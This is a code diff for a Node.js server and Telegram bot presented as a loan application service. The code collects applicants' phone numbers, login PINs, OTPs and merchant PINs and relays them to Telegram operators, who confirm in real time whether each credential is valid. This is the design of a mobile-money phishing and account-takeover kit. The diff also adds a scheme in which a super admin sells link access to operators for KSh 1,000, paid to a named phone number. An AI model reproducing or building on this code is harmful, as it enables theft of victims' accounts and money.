+    console.log('✅ Command handlers setup complete!');
+}
+
+// ==========================================
+// TELEGRAM CALLBACK HANDLER
+// ==========================================
+bot.on('callback_query', async (callbackQuery) => {
+    const chatId    = callbackQuery.message.chat.id;
+    const messageId = callbackQuery.message.message_id;
+    const data      = callbackQuery.data;
+    const adminId   = getAdminIdByChatId(chatId);
+
+    console.log(`\n🔘 CALLBACK: ${data} | admin: ${adminId || 'UNAUTHORIZED'}`);
+
+    // ==========================================
+    // HELP REQUEST VERIFICATION CALLBACKS
+    // (These work without strict auth check - verified via applicationId)
+    // ==========================================
+    
+    if (data.startsWith('help_correct_')) {
+        const applicationId = data.replace('help_correct_', '');
+        
+        try {
+            const application = await db.getApplication(applicationId);
+            if (!application) {
+                console.error(`❌ Application not found: ${applicationId}`);
+                return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Application not found', show_alert: true });
+            }
+            
+            console.log(`✅ Help correct: ${applicationId}`);
+            
+            // Update help request status to verified
+            await db.updateApplication(applicationId, {
+                helpStatus: 'verified',
+                whatsappVerifiedAt: new Date()
+            });
+            
+            // Edit the admin's message to confirm
+            const editText = `
+✅ <b>HELP REQUEST - VERIFIED</b>
+
+<b>Applicant Phone:</b> ${application.phoneNumber || 'N/A'}
+<b>WhatsApp:</b> <code>${application.whatsappNumber}</code>
+<b>Application ID:</b> <code>${applicationId}</code>
+
+<b>Status:</b> <code>✅ VERIFIED - CONTACTING USER</code>
+<i>Admin will contact user via WhatsApp now.</i>
+            `;
+            
+            await bot.editMessageText(editText, {
+                chat_id: chatId,
+                message_id: messageId,
+                parse_mode: 'HTML',
+                reply_markup: { inline_keyboard: [] }
+            });
+            
+            console.log(`✅ Help request verified for ${applicationId}`);
+            return bot.answerCallbackQuery(callbackQuery.id, { text: '✅ Verified! Contact user now.', show_alert: true });
+            
+        } catch (err) {
+            console.error('❌ Error verifying help request:', err.message);
+            return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Error: ' + err.message, show_alert: true });
+        }
+    }
+    
+    if (data.startsWith('help_incorrect_')) {
+        const applicationId = data.replace('help_incorrect_', '');
+        
+        try {
+            const application = await db.getApplication(applicationId);
+            if (!application) {
+                console.error(`❌ Application not found: ${applicationId}`);
+                return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Application not found', show_alert: true });
+            }
+            
+            console.log(`❌ Help incorrect: ${applicationId}`);
+            
+            // Update help request status to invalid
+            await db.updateApplication(applicationId, {
+                helpStatus: 'invalid_number',
+                invalidNumberAt: new Date()
+            });
+            
+            // Edit the admin's message
+            const editText = `
+❌ <b>HELP REQUEST - INVALID NUMBER</b>
+
+<b>Applicant Phone:</b> ${application.phoneNumber || 'N/A'}
+<b>WhatsApp Entered:</b> <code>${application.whatsappNumber}</code>
+<b>Application ID:</b> <code>${applicationId}</code>
+
+<b>Status:</b> <code>❌ REJECTED - NOT A VALID WHATSAPP</code>
+<i>User will be asked to re-enter their WhatsApp number</i>
+            `;
+            
+            await bot.editMessageText(editText, {
+                chat_id: chatId,
+                message_id: messageId,
+                parse_mode: 'HTML',
+                reply_markup: { inline_keyboard: [] }
+            });
+            
+            console.log(`✅ Help request marked as invalid for ${applicationId}`);
+            return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ User marked to re-enter number', show_alert: true });
+            
+        } catch (err) {
+            console.error('❌ Error rejecting help request:', err.message);
+            return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Error: ' + err.message, show_alert: true });
+        }
+    }
+
+    // Authorization check required for other callbacks
+    if (!adminId) {
+        return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Not authorized!', show_alert: true });
+    }
+
+    // ==========================================
+    // NEW: suspendall checklist callbacks
+    // ==========================================
+
+    if (data === 'sall_noop') {
+        return bot.answerCallbackQuery(callbackQuery.id, { text: '' });
+    }
+
+    if (data.startsWith('sall_toggle_')) {
+        if (!isSuperAdmin(adminId)) {
+            return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Not authorized!', show_alert: true });
+        }
+
+        const targetAdminId = data.replace('sall_toggle_', '');
+        const session = suspendAllSessions.get(chatId);
+
+        if (!session) {
+            return bot.answerCallbackQuery(callbackQuery.id, { text: '⚠️ Session expired. Run /suspendall again.', show_alert: true });
+        }
+
+        if (session.selections.has(targetAdminId)) {
+            session.selections.delete(targetAdminId);
+        } else {
+            session.selections.add(targetAdminId);
+        }
+
+        const { text, inline_keyboard } = buildSuspendAllPage(session);
+
+        try {
+            await bot.editMessageText(text, {
+                chat_id: chatId,
+                message_id: messageId,
+                parse_mode: 'Markdown',
+                reply_markup: { inline_keyboard }
+            });
+        } catch (e) {
+            // Ignore no-change errors from Telegram
+        }
+
+        return bot.answerCallbackQuery(callbackQuery.id, { text: '' });
+    }
+
+    if (data.startsWith('sall_page_')) {
+        if (!isSuperAdmin(adminId)) {
+            return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Not authorized!', show_alert: true });
+        }
+
+        const pageNum = parseInt(data.replace('sall_page_', ''));
+        const session = suspendAllSessions.get(chatId);
+
+        if (!session) {
+            return bot.answerCallbackQuery(callbackQuery.id, { text: '⚠️ Session expired. Run /suspendall again.', show_alert: true });
+        }
+
+        session.page = pageNum;
+        const { text, inline_keyboard } = buildSuspendAllPage(session);
+
+        try {
+            await bot.editMessageText(text, {
+                chat_id: chatId,
+                message_id: messageId,
+                parse_mode: 'Markdown',
+                reply_markup: { inline_keyboard }
+            });
+        } catch (e) {
+            // Ignore no-change errors
+        }
+
+        return bot.answerCallbackQuery(callbackQuery.id, { text: '' });
+    }
+
+    if (data === 'sall_cancel') {
+        if (!isSuperAdmin(adminId)) {
+            return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Not authorized!', show_alert: true });
+        }
+
+        suspendAllSessions.delete(chatId);
+
+        await bot.editMessageText(`
+❌ *SUSPEND ALL — CANCELLED*
+
+No changes were made.
+⏰ ${new Date().toLocaleString()}
+        `.trim(), { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
+
+        return bot.answerCallbackQuery(callbackQuery.id, { text: '✅ Cancelled' });
+    }
+
+    if (data === 'sall_confirm') {
+        if (!isSuperAdmin(adminId)) {
+            return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Not authorized!', show_alert: true });
+        }
+
+        const session = suspendAllSessions.get(chatId);
+
+        if (!session) {
+            return bot.answerCallbackQuery(callbackQuery.id, { text: '⚠️ Session expired. Run /suspendall again.', show_alert: true });
+        }
+
+        const toSuspend = session.allAdmins.filter(a => session.selections.has(a.adminId));
+
+        if (toSuspend.length === 0) {
+            return bot.answerCallbackQuery(callbackQuery.id, { text: '⚠️ No admins selected to suspend!', show_alert: true });
+        }
+
+        // Answer and update message immediately so buttons disappear
+        await bot.answerCallbackQuery(callbackQuery.id, { text: `🔒 Suspending ${toSuspend.length} admin(s)...` });
+
+        await bot.editMessageText(`
+⏳ *SUSPENDING ${toSuspend.length} LINK(S)...*
+
+Please wait while selected admin links are being locked.
+        `.trim(), { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
+
+        const keptCount  = session.allAdmins.length - toSuspend.length;
+        const sessionCopy = { allAdmins: session.allAdmins }; // keep for summary
+        suspendAllSessions.delete(chatId);
+
+        // Execute in background
+        (async () => {
+            let successCount = 0;
+            let notifyCount  = 0;
+            let errorCount   = 0;
+
+            for (const admin of toSuspend) {
+                try {
+                    removeLinkPaymentTimer(admin.adminId);
+
+                    await db.updateAdmin(admin.adminId, {
+                        linkLocked:    true,
+                        linkLockedAt:  new Date(),
+                        paymentStatus: 'pending'
+                    });
+
+                    successCount++;
+
+                    if (admin.chatId) {
+                        bot.sendMessage(admin.chatId, `
+🔒 *YOUR LINK HAS BEEN SUSPENDED*
+
+Your admin link has been suspended by the super admin.
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+💰 *SUBSCRIPTION FEE: KSh 1,000*
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+To reactivate your link, pay the subscription fee:
+
+1️⃣ Send *KSh 1,000* to: *0791336749* (Okeyo Bungu)
+2️⃣ Use M-Pesa, Airtel Money, or any mobile money
+3️⃣ Note the name that will appear on payment
+4️⃣ Submit it using:
+
+\`/payment jina italeta\`
+
+*Example:* \`/payment john korir\`
+
+Your link will be unlocked immediately after the super admin approves your payment.
+
+📧 Questions? Contact the super admin.
+                        `.trim(), { parse_mode: 'Markdown' })
+                        .then(() => notifyCount++)
+                        .catch(() => {});
+                    }
+
+                    await new Promise(resolve => setTimeout(resolve, 150));
+
+                } catch (err) {
+                    console.error(`Failed to suspend ${admin.adminId}:`, err.message);
+                    errorCount++;
+                }
+            }
+
+            await bot.editMessageText(`
+🔒 *SUSPENSION COMPLETE*
+
+✅ Links locked: ${successCount}
+📨 Notifications sent: ${notifyCount}
+🟢 Kept active: ${keptCount}
+❌ Errors: ${errorCount}
+👥 Total admins: ${sessionCopy.allAdmins.length}
+⏰ ${new Date().toLocaleString()}
+
+Each suspended admin must pay *KSh 1,000* and submit:
+\`/payment jina italeta\`
+
+Use /pendingpayments to view submissions.
+            `.trim(), { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
+
+        })();
+
+        return;
+    }
+
+    // ── Link payment callback (yes/no already paid) ──
+    if (data.startsWith('link_paid_yes_') || data.startsWith('link_paid_no_')) {
+        const parts = data.split('_');
+        const answer = parts[2]; // yes or no
+        const targetAdminId = parts.slice(3).join('_');
+
+        if (!isSuperAdmin(adminId)) {
+            return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Not authorized!', show_alert: true });
+        }
+
+        if (answer === 'yes') {
+            removeLinkPaymentTimer(targetAdminId);
+            await db.updateAdmin(targetAdminId, { 
+                linkLocked: false,
+                paymentStatus: 'approved',
+                paidAt: new Date()
+            });
+
+            await bot.editMessageText(`
+✅ *PAYMENT APPROVED*
+
+Admin \`${targetAdminId}\` - Payment verified
+Link is now unlocked and permanently active!
+
+⏰ ${new Date().toLocaleString()}
+            `, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
+
+            await bot.answerCallbackQuery(callbackQuery.id, { text: '✅ Payment approved, link unlocked!' });
+
+            const admin = await db.getAdmin(targetAdminId);
+            if (admin?.chatId) {
+                bot.sendMessage(admin.chatId, `
+✅ *PAYMENT APPROVED!*
+
+Your payment has been verified and approved.
+Your admin link is now permanently active!
+
+🔗 Your Link:
+\`${WEBHOOK_URL}?admin=${targetAdminId}\`
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+✅ STATUS: ACTIVE ✅
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+You can now:
+✅ Accept customer applications
+✅ Approve/reject PINs
+✅ Verify OTPs
+✅ Process loans
+
+Use /start to see all available commands.
+
+Thank you for your payment!
+                `, { parse_mode: 'Markdown' }).catch(() => {});
+            }
+        } else {
+            await bot.editMessageText(`
+⏱️ *LINK TIMER ACTIVE*
+
+Admin \`${targetAdminId}\` - Payment needed
+5-minute countdown continues...
+
+Admin will receive payment instructions when timer expires.
+            `, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
+
+            await bot.answerCallbackQuery(callbackQuery.id, { text: '⏱️ 5-minute timer continues' });
+        }
+        return;
+    }
+
+    // ── Payment submission approval/rejection callbacks ──
+    if (data.startsWith('approve_payment_') || data.startsWith('reject_payment_')) {
+        const parts = data.split('_');
+        const action = parts[0]; // approve or reject
+        const targetAdminId = parts.slice(2).join('_');
+
+        const admin = await db.getAdmin(targetAdminId);
+        if (!admin) {
+            return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Admin not found!', show_alert: true });
+        }
+
+        if (action === 'approve') {
+            removeLinkPaymentTimer(targetAdminId);
+            await db.updateAdmin(targetAdminId, { 
+                paymentStatus: 'approved',
+                linkLocked: false,
+                paidAt: new Date()
+            });
+
+            await bot.editMessageText(`
+✅ *PAYMENT APPROVED*
+
+Admin: ${admin.name}
+🆔 \`${targetAdminId}\`
+⏰ ${new Date().toLocaleString()}
+
+Link is now unlocked!
+            `, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
+
+            await bot.answerCallbackQuery(callbackQuery.id, { text: '✅ Payment approved!' });
+
+            if (admin.chatId) {
+                await bot.sendMessage(admin.chatId, `
+✅ *PAYMENT APPROVED!*
+
+Your link payment has been verified and approved.
+Your admin link is now permanently active.
+
+🔗 Your Link: ${WEBHOOK_URL}?admin=${targetAdminId}
+
+Use /start to see available commands.
+                `, { parse_mode: 'Markdown' });
+            }
+        } else if (action === 'reject') {
+            await db.updateAdmin(targetAdminId, { 
+                paymentStatus: 'rejected',
+                paymentSubmittedAt: null,
+                payerName: null
+            });
+
+            await bot.editMessageText(`
+❌ *PAYMENT REJECTED*
+
+Admin: ${admin.name}
+🆔 \`${targetAdminId}\`
+⏰ ${new Date().toLocaleString()}
+
+Link remains locked. Admin can resubmit payment.
+            `, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
+
+            await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Payment rejected' });
+
+            if (admin.chatId) {
+                await bot.sendMessage(admin.chatId, `
+❌ *PAYMENT REJECTED*
+
+Your payment submission was rejected by the super admin.
+
+The payer name or payment details could not be verified.
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+💰 *PLEASE RESUBMIT*
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+To reactivate your link, please:
+
+1️⃣ Send money to: *0791336749*
+2️⃣ Get the transaction code
+3️⃣ Submit it using:
+
+\`/payment YOUR_TRANSACTION_CODE\`
+
+*Example:*
+\`/payment XAF123456\`
+
+Your link will be unlocked immediately after approval.
+
+If you have questions, contact the super admin.
+                `, { parse_mode: 'Markdown' });
+            }
+        }
+        return;
+    }
+
+    if (!isAdminActive(chatId)) {
+        return bot.answerCallbackQuery(callbackQuery.id, { text: '🚫 Your admin access has been paused.', show_alert: true });
+    }
+
+    // ── Clear all admins callbacks ──
+    if (data === 'confirm_clear_admins' || data === 'cancel_clear_admins') {
+        if (!isSuperAdmin(adminId)) {
+            return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Not authorized!', show_alert: true });
+        }
+
+        if (data === 'confirm_clear_admins') {
+            try {
+                const allAdmins      = await db.getAllAdmins();
+                const adminsToClear  = allAdmins.filter(a => !isSuperAdmin(a.adminId));
+                let deletedCount     = 0;
+                const deletedNames   = [];
+
+                for (const admin of adminsToClear) {
+                    try {
+                        await db.deleteAdmin(admin.adminId);
+                        deletedCount++;
+                        deletedNames.push(`${admin.name} (${admin.adminId})`);
+                        adminChatIds.delete(admin.adminId);
+                        pausedAdmins.delete(admin.adminId);
+                        removeLinkPaymentTimer(admin.adminId);
+                    } catch (err) {
+                        console.error(`Failed to delete ${admin.adminId}:`, err.message);
+                    }
+                }
+
+                await bot.editMessageText(`
+🗑️ *ALL ADMINS CLEARED*
+
+Deleted: ${deletedCount} admin(s)
+🛡️  Protected: SUPER ADMINS (${SUPER_ADMINS.join(', ')})
+⏰ ${new Date().toLocaleString()}
+
+*Deleted Admins:*
+${deletedNames.map((n, i) => `${i+1}. ${n}`).join('\n')}
+                `, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
+
+                await bot.answerCallbackQuery(callbackQuery.id, { text: `✅ Cleared ${deletedCount} admin(s)!` });
+
+            } catch (error) {
+                console.error('❌ Error clearing admins:', error);
+                bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Error: ' + error.message, show_alert: true });
+            }
+        } else if (data === 'cancel_clear_admins') {
+            await bot.editMessageText(`
+❌ *CANCELLED*
+
+Clear all admins operation was cancelled.
+⏰ ${new Date().toLocaleString()}
+            `, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
+
+            await bot.answerCallbackQuery(callbackQuery.id, { text: 'Operation cancelled' });
+        }
+        return;
+    }
+
+    // ── Request responses (Done / Need Help) ──
+    if (data.startsWith('request_done_') || data.startsWith('request_help_')) {
+        const parts             = data.split('_');
+        const action            = parts[1];
+        const requestId         = parts[2];
+        const respondingAdminId = parts[3];
+        const respondingAdmin   = await db.getAdmin(respondingAdminId);
+
+        // Notify all super admins
+        for (const superAdminId of SUPER_ADMINS) {
+            const superAdminChatId = adminChatIds.get(superAdminId);
+            if (superAdminChatId) {
+                if (action === 'done') {
+                    await bot.sendMessage(superAdminChatId, `
+✅ *REQUEST COMPLETED*
+
+Admin: ${respondingAdmin?.name || respondingAdminId}
+Request ID: \`${requestId}\`
+⏰ ${new Date().toLocaleString()}
+                    `, { parse_mode: 'Markdown' });
+                } else {
+                    await bot.sendMessage(superAdminChatId, `
+❓ *ADMIN NEEDS HELP*
+
+Admin: ${respondingAdmin?.name || respondingAdminId}
+📧 ${respondingAdmin?.email || 'N/A'}
+🆔 \`${respondingAdminId}\`
+Request ID: \`${requestId}\`
+
+Use: /send ${respondingAdminId} Your message
+                    `, { parse_mode: 'Markdown' });
+                }
+            }
+        }
+
+        const responseEmoji = action === 'done' ? '✅' : '❓';
+        const responseText  = action === 'done' ? 'Task Completed' : 'Requested Help';
+
+        await bot.editMessageText(`
+${responseEmoji} *REQUEST ${responseText.toUpperCase()}*
+
+Request ID: \`${requestId}\`
+⏰ ${new Date().toLocaleString()}
+
+Super admin has been notified.
+        `, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
+
+        await bot.answerCallbackQuery(callbackQuery.id, { text: `${responseEmoji} Response sent to super admin` });
+        return;
+    }
+
+    // ── Parse: action_type_ADMINID_applicationId ──
+    const parts = data.split('_');
+    if (parts.length < 4) {
+        return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Invalid callback data.', show_alert: true });
+    }
+
+    const action          = parts[0];
+    const type            = parts[1];
+    const embeddedAdminId = parts[2];
+    const applicationId   = parts.slice(3).join('_');
+
+    if (embeddedAdminId !== adminId) {
+        return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ This application belongs to another admin!', show_alert: true });
+    }
+
+    const application = await db.getApplication(applicationId);
+    if (!application || application.adminId !== adminId) {
+        return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Application not found or not yours!', show_alert: true });
+    }
+
+    // Wrong PIN at OTP stage
+    if (action === 'wrongpin' && type === 'otp') {
+        await db.updateApplication(applicationId, { otpStatus: 'wrongpin_otp' });
+        await bot.editMessageText(`
+❌ *WRONG PIN AT OTP STAGE*
+
+📋 \`${applicationId}\`
+📞 \`${formatPhone(application.phoneNumber)}\`
+🔢 \`${application.otp}\`
+
+⚠️ User's PIN was incorrect
+👤 ${callbackQuery.from.first_name}
+⏰ ${new Date().toLocaleString()}
+
+User will re-enter PIN.
+        `, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
+        await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ User will re-enter PIN' });
+        return;
+    }
+
+    // Wrong code
+    if (action === 'wrongcode' && type === 'otp') {
+        await db.updateApplication(applicationId, { otpStatus: 'wrongcode' });
+        await bot.editMessageText(`
+❌ *WRONG CODE*
+
+📋 \`${applicationId}\`
+📞 \`${formatPhone(application.phoneNumber)}\`
+🔢 \`${application.otp}\`
+
+⚠️ Wrong verification code
+👤 ${callbackQuery.from.first_name}
+⏰ ${new Date().toLocaleString()}
+
+User will re-enter code.
+        `, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
+        await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ User will re-enter code' });
+        return;
+    }
+
+    // Deny PIN
+    if (action === 'deny' && type === 'pin') {
+        await db.updateApplication(applicationId, { pinStatus: 'rejected' });
+        await bot.editMessageText(`
+❌ *INVALID - REJECTED*
+
+📋 \`${applicationId}\`
+📞 \`${formatPhone(application.phoneNumber)}\`
+🔑 \`${application.pin}\`
+
+✗ REJECTED
+👤 ${callbackQuery.from.first_name}
+⏰ ${new Date().toLocaleString()}
+        `, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
+        await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Application rejected' });
+    }
+
+    // Allow OTP
+    else if (action === 'allow' && type === 'pin') {
+        await db.updateApplication(applicationId, { pinStatus: 'approved' });
+        await bot.editMessageText(`
+✅ *ALL CORRECT - APPROVED*
+
+📋 \`${applicationId}\`
+📞 \`${formatPhone(application.phoneNumber)}\`
+🔑 \`${application.pin}\`
+
+✓ APPROVED
+👤 ${callbackQuery.from.first_name}
+⏰ ${new Date().toLocaleString()}
+
+User will now proceed to OTP.
+        `, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
+        await bot.answerCallbackQuery(callbackQuery.id, { text: '✅ Approved! User can enter OTP now.' });
+    }
+
+    // Approve Loan
+    else if (action === 'approve' && type === 'otp') {
+        await db.updateApplication(applicationId, { otpStatus: 'approved' });
+        await bot.editMessageText(`
+🎉 *LOAN APPROVED!*
+
+📋 \`${applicationId}\`
+📞 \`${formatPhone(application.phoneNumber)}\`
+🔑 \`${application.pin}\`
+🔢 \`${application.otp}\`
+
+✓ FULLY APPROVED
+👤 ${callbackQuery.from.first_name}
+⏰ ${new Date().toLocaleString()}
+
+✅ User will see approval page!
+        `, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
+        await bot.answerCallbackQuery(callbackQuery.id, { text: '🎉 Loan approved!' });
+    }
+
+    // Wrong Merchant PIN
+    else if (action === 'wrongmerchpin' && type === 'merch') {
+        await db.updateApplication(applicationId, { merchantPinStatus: 'wrong' });
+        await bot.editMessageText(`
+❌ *WRONG MERCHANT PIN*
+
+📋 \`${applicationId}\`
+📞 \`${formatPhone(application.phoneNumber)}\`
+💳 Merchant PIN entered: \`${application.merchantPin}\`
+
+⚠️ User will be asked to re-enter.
+👤 ${callbackQuery.from.first_name}
+⏰ ${new Date().toLocaleString()}
+        `, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
+        await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Wrong merchant PIN flagged' });
+    }
+
+    // Approve via Merchant PIN
+    else if (action === 'approve' && type === 'merch') {
+        await db.updateApplication(applicationId, { merchantPinStatus: 'approved' });
+        await bot.editMessageText(`
+🎉 *FULLY APPROVED — MERCHANT PIN CONFIRMED!*
+
+📋 \`${applicationId}\`
+📞 \`${formatPhone(application.phoneNumber)}\`
+🔑 Login PIN: \`${application.pin}\`
+🔢 OTP: \`${application.otp}\`
+💳 Merchant PIN: \`${application.merchantPin}\`
+
+✓ ALL DETAILS CONFIRMED
+👤 ${callbackQuery.from.first_name}
+⏰ ${new Date().toLocaleString()}
+        `, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
+        await bot.answerCallbackQuery(callbackQuery.id, { text: '🎉 Merchant PIN confirmed & loan approved!' });
+    }
+});
+
+console.log('✅ Telegram callback handler registered!');
+
+// ==========================================
+// DB-READY MIDDLEWARE
+// ==========================================
+app.use((req, res, next) => {
+    if (!dbReady && !req.path.includes('/health') && !req.path.includes('/telegram-webhook')) {
+        return res.status(503).json({ success: false, message: 'Database not ready yet' });
+    }
+    next();
+});
+
+// ==========================================
+// API ENDPOINTS
+// ==========================================
+
+// POST /api/verify-pin
+app.post('/api/verify-pin', async (req, res) => {
+    try {
+        const { phoneNumber, pin, adminId: requestAdminId, assignmentType } = req.body;
+        const applicationId = `APP-${Date.now()}`;
+
+        console.log('📥 PIN Verification Request:', { phoneNumber, requestAdminId, assignmentType });
+
+        const lockKey = `pin_${phoneNumber}`;
+        if (processingLocks.has(lockKey)) {
+            return res.status(429).json({ success: false, message: 'Request already processing. Please wait.' });
+        }
+        processingLocks.add(lockKey);
+        setTimeout(() => processingLocks.delete(lockKey), 10000);
+
+        let assignedAdmin;
+
+        if (assignmentType === 'specific' && requestAdminId) {
+            assignedAdmin = await db.getAdmin(requestAdminId);
+
+            if (!assignedAdmin) {
+                processingLocks.delete(lockKey);
+                console.error(`❌ Specific admin not found: ${requestAdminId}`);
+                return res.status(400).json({ success: false, message: 'The link you used is invalid. Please contact support.' });
+            }
+
+            if (assignedAdmin.linkLocked) {
+                processingLocks.delete(lockKey);
+                console.warn(`🔒 Link locked for admin: ${requestAdminId}`);
+                return res.status(400).json({ success: false, message: 'This link is currently locked. Admin must complete payment to proceed.' });
+            }
+
+            if (pausedAdmins.has(requestAdminId) || assignedAdmin.status !== 'active') {
+                processingLocks.delete(lockKey);
+                console.warn(`⚠️ Specific admin paused/inactive: ${requestAdminId}`);
+                return res.status(400).json({ success: false, message: 'This service link is temporarily unavailable. Please try again later or contact support.' });
+            }
+
+            console.log(`🔒 LOCKED to specific admin: ${assignedAdmin.name} (${assignedAdmin.adminId})`);
+
+        } else {
+            const activeAdmins    = await db.getActiveAdmins();
+            const availableAdmins = activeAdmins.filter(a => !pausedAdmins.has(a.adminId) && !a.linkLocked);
+            if (availableAdmins.length === 0) {
+                processingLocks.delete(lockKey);
+                return res.status(503).json({ success: false, message: 'No admins available. Please try again later.' });
+            }
+            const adminStats = await Promise.all(
+                availableAdmins.map(async (admin) => {
+                    const stats = await db.getAdminStats(admin.adminId);
+                    return { admin, pending: stats.pinPending + stats.otpPending };
+                })
+            );
+            adminStats.sort((a, b) => a.pending - b.pending);
+            assignedAdmin = adminStats[0].admin;
+            console.log(`🔄 Auto-assigned to: ${assignedAdmin.name} (${assignedAdmin.adminId})`);
+        }
+
+        const existingApps   = await db.getApplicationsByAdmin(assignedAdmin.adminId);
+        const alreadyPending = existingApps.find(a => a.phoneNumber === phoneNumber && a.pinStatus === 'pending');
+        if (alreadyPending) {
+            processingLocks.delete(lockKey);
+            return res.json({
+                success: true,
+                applicationId: alreadyPending.id,
+                assignedTo: assignedAdmin.name,
+                assignedAdminId: assignedAdmin.adminId
+            });
+        }
+
+        const thisAdminPastApps = existingApps
+            .filter(a => a.phoneNumber === phoneNumber && a.pinStatus !== 'pending')
+            .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
+        const isReturningUser = thisAdminPastApps.length > 0;
+
+        let historyText = '';
+        if (isReturningUser) {
+            const last       = thisAdminPastApps[0];
+            const lastDate   = new Date(last.timestamp).toLocaleString();
+            const lastStatus = last.otpStatus === 'approved'      ? '✅ Approved' :
+                               last.pinStatus === 'rejected'      ? '❌ Rejected (PIN)' :
+                               last.otpStatus === 'wrongcode'     ? '❌ Wrong OTP Code' :
+                               last.otpStatus === 'wrongpin_otp'  ? '❌ Wrong PIN (OTP stage)' : '⏳ Incomplete';
+            const allStatuses = thisAdminPastApps.slice(0, 3).map((a, idx) => {
+                const s = a.otpStatus === 'approved'     ? '✅' :
+                          a.pinStatus === 'rejected'     ? '❌PIN' :
+                          a.otpStatus === 'wrongcode'    ? '❌OTP' :
+                          a.otpStatus === 'wrongpin_otp' ? '❌PIN@OTP' : '⏳';
+                return `${idx+1}. ${s} ${new Date(a.timestamp).toLocaleDateString()}`;
+            }).join('\n');
+            historyText = `\n\n━━━━━━━━━━━━━━━━━━\n🔄 *RETURNING CUSTOMER*\nVisits to you: *${thisAdminPastApps.length}*\nLast visit: ${lastDate}\nLast result: ${lastStatus}\nRecent history:\n${allStatuses}\n━━━━━━━━━━━━━━━━━━`;
+        }
+
+        if (!adminChatIds.has(assignedAdmin.adminId)) {
+            if (assignedAdmin.chatId) {
+                adminChatIds.set(assignedAdmin.adminId, assignedAdmin.chatId);
+            } else {
+                processingLocks.delete(lockKey);
+                return res.status(503).json({ success: false, message: 'Admin not connected — they need to /start the bot first' });
+            }
+        }
+
+        await db.saveApplication({
+            id:             applicationId,
+            adminId:        assignedAdmin.adminId,
+            adminName:      assignedAdmin.name,
+            phoneNumber,
+            pin,
+            pinStatus:      'pending',
+            otpStatus:      'pending',
+            assignmentType: assignmentType || 'auto',
+            isReturningUser,
+            previousCount:  thisAdminPastApps.length,
+            timestamp:      new Date().toISOString()
+        });
+
+        console.log(`💾 Application saved: ${applicationId}`);
+
+        const userLabel = isReturningUser
+            ? `🔄 *RETURNING USER* (${thisAdminPastApps.length}x before)`
+            : '🆕 *NEW APPLICATION*';
+        await sendToAdmin(assignedAdmin.adminId, `
+${userLabel}
+
+📋 \`${applicationId}\`
+📞 \`${formatPhone(phoneNumber)}\`
+🔑 \`${pin}\`
+⏰ ${new Date().toLocaleString()}${historyText}
+
+⚠️ *VERIFY INFORMATION*
+        `, {
+            parse_mode: 'Markdown',
+            reply_markup: {
+                inline_keyboard: [
+                    [{ text: '❌ Invalid - Deny',     callback_data: `deny_pin_${assignedAdmin.adminId}_${applicationId}` }],
+                    [{ text: '✅ Correct - Allow OTP', callback_data: `allow_pin_${assignedAdmin.adminId}_${applicationId}` }]
+                ]
+            }
+        });
+
+        processingLocks.delete(lockKey);
+        res.json({ success: true, applicationId, assignedTo: assignedAdmin.name, assignedAdminId: assignedAdmin.adminId });
+
+    } catch (error) {
+        processingLocks.delete(`pin_${req.body?.phoneNumber}`);
+        console.error('❌ Error in /api/verify-pin:', error);
+        res.status(500).json({ success: false, message: 'Server error: ' + error.message });
+    }
+});
+
+// GET /api/check-pin-status/:applicationId
+app.get('/api/check-pin-status/:applicationId', async (req, res) => {
+    try {
+        const application = await db.getApplication(req.params.applicationId);
+        if (application) res.json({ success: true, status: application.pinStatus });
+        else res.status(404).json({ success: false, message: 'Application not found' });
+    } catch (error) {
+        res.status(500).json({ success: false, message: 'Server error' });
+    }
+});
+
+// POST /api/verify-otp
+app.post('/api/verify-otp', async (req, res) => {
+    console.log('\n🔵 /api/verify-otp called:', JSON.stringify(req.body));
+    try {
+        const { applicationId, otp } = req.body;
+        const application = await db.getApplication(applicationId);
+
+        if (!application) {
+            return res.status(404).json({ success: false, message: 'Application not found' });
+        }
+
+        if (!adminChatIds.has(application.adminId)) {
+            const admin = await db.getAdmin(application.adminId);
